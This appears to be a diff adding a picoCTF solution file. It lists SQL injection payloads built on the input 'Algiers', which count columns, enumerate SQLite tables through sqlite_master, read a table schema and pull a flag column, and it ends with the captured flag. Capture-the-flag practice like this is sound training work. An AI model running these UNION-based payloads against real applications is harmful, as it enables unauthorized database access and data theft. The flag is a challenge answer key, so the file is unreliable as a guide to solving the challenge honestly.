@@ -1,0 +1,10 @@
+Algiers' ORDER by 3-- -
+
+Algiers' UNION SELECT name,2,3 FROM sqlite_master WHERE type='table'-- -
+
+Algiers' UNION SELECT sql,2,3 FROM sqlite_master WHERE tbl_name='more_table' AND type='table'-- -
+Algiers' UNION SELECT flag,2,3 FROM sqlite_master WHERE tbl_name='more_table' AND type='table'-- -
+
+Algiers' UNION SELECT flag,2,3 FROM more_table-- -
+
+picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}	
